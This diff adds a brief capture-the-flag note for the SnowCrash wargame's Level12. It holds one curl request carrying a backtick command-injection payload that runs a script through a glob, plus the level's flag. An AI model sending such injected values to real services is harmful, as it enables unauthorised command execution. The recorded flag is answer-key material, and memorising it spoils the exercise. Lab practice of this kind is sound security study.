@@ -1,0 +1,7 @@
+#+TITLE: SnowCrash -- Level12
+
+
+curl 'localhost:4646?x="`/*/HERE`"'
+
+* FLAG:
+** g1qKMiRpXf53AWhDaU7FEkczr
